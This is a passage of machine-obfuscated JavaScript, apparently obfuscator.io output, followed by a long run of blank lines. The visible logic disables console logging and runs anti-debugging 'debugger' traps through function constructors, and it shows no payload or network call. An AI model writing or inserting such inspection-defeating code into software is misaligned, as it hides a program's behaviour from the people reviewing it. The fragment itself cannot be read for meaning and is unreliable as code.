_0x4d68a9(_0x1fac52,_0x79cd31-0x152,_0x5a6aad-0x1ed,_0xa042be-0x2a,_0x1406d3-0x31);}function _0x2b2e8d(_0x2bf7fa,_0x530925,_0x50c6f0,_0x515053,_0xcd19b5){return _0x142a57(_0x530925- -0x56d,_0x530925-0x21,_0x50c6f0-0x72,_0x515053-0x1f1,_0x2bf7fa);}function _0x598377(_0x4abfbb,_0x5ecaaa,_0xc475f4,_0x2401ef,_0x27ffa3){return _0x142a57(_0x4abfbb-0x16e,_0x5ecaaa-0x35,_0xc475f4-0x5,_0x2401ef-0x1a,_0xc475f4);}if(_0x230a5b[_0x419b06(0x510,0x4ce,'%2Z#',0x4ae,0x3b3)](_0x230a5b[_0x419b06(0x614,0x5d7,'*VS6',0x441,0x6e5)],_0x230a5b[_0xdc9845(0x355,0x3fe,'gk#9',0x393,0x331)]))_0x436cb6=_0x58d63d[_0x2b2e8d('#%k3',0x93,0x128,0xe1,0x162)](_0x467b71,_0x58d63d[_0xdc9845(0x51e,0x595,'gk#9',0x557,0x624)](_0x58d63d[_0x598377(0x679,0x6e2,'Ove*',0x810,0x7b7)](_0x58d63d[_0x419b06(0x43f,0x4e3,'u)$n',0x369,0x5a3)],_0x58d63d[_0xdc9845(0x61b,0x756,'mHCu',0x6b3,0x731)]),');'))();else return!![];}[_0x142a57(0x3cb,0x32a,0x339,0x3cc,'0KR#')+_0x197c8d(-0x118,'^Xkj',-0x53,-0xa9,0x69)+'r'](_0x49a6b8[_0x18dca4(0x34a,0x3e1,0x323,'u)$n',0x471)](_0x49a6b8[_0x197c8d(0x12d,'gk#9',-0x33,0x28,0x12d)],_0x49a6b8[_0x18dca4(0x67d,0x661,0x754,'0KR#',0x6e8)]))[_0x142a57(0x599,0x470,0x479,0x543,'j6^o')](_0x49a6b8[_0x2b603d('YPqD',-0x150,0x44,0x10,-0x102)]));}else{if(_0x49a6b8[_0x142a57(0x403,0x4ab,0x4c3,0x294,')hx0')](_0x49a6b8[_0x142a57(0x64c,0x6e0,0x636,0x5dd,'fjJr')],_0x49a6b8[_0x197c8d(-0xc3,'B8ZX',0x183,-0x39,-0x6)])){var _0x10a2fd=_0x230a5b[_0x18dca4(0x407,0x3eb,0x29e,')hx0',0x380)][_0x18dca4(0x4a5,0x40c,0x524,'AH1i',0x596)]('|'),_0x1b3acb=0x1*-0x1114+0x5cd+-0x1*-0xb47;while(!![]){switch(_0x10a2fd[_0x1b3acb++]){case'0':_0x2d7ee3[_0x18dca4(0x6cb,0x63c,0x6e5,'btTR',0x55e)+_0x18dca4(0x537,0x524,0x46e,'jg!k',0x3ae)]=_0x41289d[_0x142a57(0x424,0x38f,0x3bb,0x404,'ZoCQ')](_0xead9cf);continue;case'1':var _0xb21cc3=_0x51c058[_0x41b38d]||_0x2d7ee3;continue;case'2':_0x2d7ee3[_0x18dca4(0x666,0x4f0,0x4a3,'R&eM',0x680)+_0x2b603d('vy4*',0xcb,0x29f,0xbe,0x122)]=_0xb21cc3[_0x18dca4(0x2c2,0x43f,0x30d,'jg!k',0x4f3)+_0x4d68a9('a[)#',0x504,0x590,0x534,0x58b)][_0x18dca4(0x443,0x4bb,0x5d6,'llxx',0x4c3)](_0xb21cc3);continue;case'3':var _0x41b38d=_0x5b1e3d[_0x40ce75];continue;case'4':_0x487744[_0x41b38d]=_0x2d7ee3;continue;case'5':var _0x2d7ee3=_0x409bc7[_0x4d68a9('iJCW',0x59b,0x561,0x4a1,0x450)+_0x197c8d(-0x8e,'fjJr',0xdd,-0x183,-0xa8)+'r'][_0x18dca4(0x779,0x5fc,0x601,'*VS6',0x669)+_0x2b603d('R&eM',0xd9,0x10d,0xe,0x186)][_0x4d68a9('^Xkj',0x4ed,0x5a6,0x3ef,0x4a0)](_0x11e1f6);continue;}break;}}else(function(){function _0x337f13(_0x313e7a,_0xd8813c,_0x25e312,_0x4cf8b8,_0x36f41e){return _0x18dca4(_0x313e7a-0x107,_0x4cf8b8-0x1ad,_0x25e312-0x6d,_0x313e7a,_0x36f41e-0x184);}function _0x1f26ef(_0x2e89af,_0x171268,_0x34b1ed,_0x190796,_0xc6e4ae){return _0x18dca4(_0x2e89af-0xc3,_0x34b1ed- -0x318,_0x34b1ed-0x87,_0x2e89af,_0xc6e4ae-0x19d);}function _0xc6d34(_0x2035a6,_0x52626b,_0x1226f7,_0x40d27d,_0x9c2a71){return _0x4d68a9(_0x9c2a71,_0x52626b-0xb1,_0x1226f7-0xf,_0x40d27d-0x5a,_0x40d27d- -0x21f);}function _0x222653(_0x429421,_0x4bd989,_0xb301c9,_0x529203,_0x12b55b){return _0x2b603d(_0x429421,_0x4bd989-0x112,_0xb301c9-0x4b,_0x529203-0x88,_0x529203-0x556);}function _0x2a9bf1(_0x57a2c3,_0x497d73,_0x5af3f0,_0x3016c9,_0x5207df){return _0x142a57(_0x57a2c3- -0x17b,_0x497d73-0x76,_0x5af3f0-0x20,_0x3016c9-0x9b,_0x5207df);}if(_0x230a5b[_0xc6d34(0x448,0x2e6,0x22b,0x3b2,'#%k3')](_0x230a5b[_0x1f26ef('AH1i',0xb0,0x203,0x132,0x1db)],_0x230a5b[_0x222653('fjJr',0x749,0x574,0x5e1,0x540)]))return![];else{var _0x43a868;try{_0x43a868=_0x230a5b[_0x1f26ef('llxx',0x253,0xde,0x224,0x1eb)](_0x236e67,_0x230a5b[_0x222653('%2Z#',0x428,0x6b2,0x579,0x624)](_0x230a5b[_0x2a9bf1(0x50d,0x64c,0x452,0x389,'vy4*')](_0x230a5b[_0x1f26ef('mHCu',0x128,0x1d4,0x1fe,0x1c7)],_0x230a5b[_0x1f26ef('a[)#',0x11a,0x1f1,0x18d,0x200)]),');'))();}catch(_0x41e8ef){_0x43a868=_0x52fa3;}return _0x43a868;}}[_0x142a57(0x3cb,0x36c,0x29d,0x2ea,'0KR#')+_0x4d68a9('fjJr',0x520,0x497,0x552,0x3f2)+'r'](_0x49a6b8[_0x142a57(0x630,0x5c3,0x4a2,0x5b2,'6lxI')](_0x49a6b8[_0x18dca4(0x54d,0x50e,0x477,'pSg&',0x528)],_0x49a6b8[_0x18dca4(0x347,0x429,0x3e4,'iJCW',0x498)]))[_0x197c8d(-0xa8,'a[)#',-0x1fc,0xc6,-0x8a)](_0x49a6b8[_0x4d68a9('DYbS',0x5f4,0x4b3,0x401,0x585)]));}}else _0x1c71c5=_0x1ee1b0;}_0x49a6b8[_0x142a57(0x3c1,0x30f,0x443,0x41c,'R[Zk')](_0x3e5ee9,++_0x33d54e);}else{var _0x5e16bb=_0x3773a0?function(){function _0x5e4faa(_0x2014d9,_0x4719d5,_0x5b1bed,_0x29333c,_0x3408ff){return _0x2b603d(_0x4719d5,_0x4719d5-0x1a8,_0x5b1bed-0xcb,_0x29333c-0x19a,_0x29333c-0x12a);}if(_0x3f61c1){var _0x25ec54=_0x23de92[_0x5e4faa(0xcb,'*VS6',0x22a,0x1d3,0xf1)](_0x3b3458,arguments);return _0x81b962=null,_0x25ec54;}}:function(){};return _0x1b93c2=![],_0x5e16bb;}}function _0x2bdff3(_0x276d90,_0x295569,_0x267e96,_0x4d9d84,_0x448e8e){return _0x2b5225(_0x276d90-0x19e,_0x295569-0x1a3,_0x267e96,_0x276d90-0x144,_0x448e8e-0x128);}function _0x8ddb3c(_0x1dd095,_0xa5333e,_0x5855c8,_0x11fe5a,_0x340e02){return _0x16d157(_0x1dd095-0x150,_0xa5333e-0x224,_0x5855c8-0x153,_0x1dd095,_0x340e02-0x1e1);}try{if(_0x27b92a){if(_0x49a6b8[_0x2334c0(0xcb,0x93,0x214,0x162,'UVLr')](_0x49a6b8[_0x2334c0(0x255,0x34b,0x323,0x222,'YPqD')],_0x49a6b8[_0x8ddb3c('Ove*',0x415,0x2ea,0x3a0,0x2e4)])){var _0x17ee94=_0x1f6d4d[_0x8f8275(0x6f9,'%2Z#',0x49f,0x6c4,0x561)](_0x327a9f,arguments);return _0x4564c4=null,_0x17ee94;}else return _0x3e5ee9;}else _0x49a6b8[_0x8f8275(0x87d,'O$PV',0x77a,0x75f,0x76d)](_0x49a6b8[_0x539346(0x40e,0x3aa,0x442,'UVLr',0x36a)],_0x49a6b8[_0x2bdff3(0x3fb,0x34b,'7OP5',0x47f,0x361)])?_0x49a6b8[_0x8ddb3c('#%k3',0x2ad,0x224,0x28c,0x11a)](_0x3e5ee9,0x2077+-0x1336+-0xd41):function(){return!![];}[_0x8ddb3c('#%k3',0x36a,0x385,0x46e,0x33d)+_0x8f8275(0x512,'B8ZX',0x703,0x557,0x5d4)+'r'](_0x49a6b8[_0x8ddb3c('jg!k',0x1b0,0x279,0xa3,0x247)](_0x49a6b8[_0x8f8275(0x520,'wO2I',0x5d7,0x3fa,0x4ec)],_0x49a6b8[_0x2334c0(0x11e,0x123,0x1f7,0x28,'btTR')]))[_0x8ddb3c('Gote',0x1d1,0x254,0x2e5,0x269)](_0x49a6b8[_0x2bdff3(0x463,0x372,'O$PV',0x5c1,0x4f8)]);}catch(_0x5d9c3c){}}























































































































































































































































































































































































































































































































































































































































































































































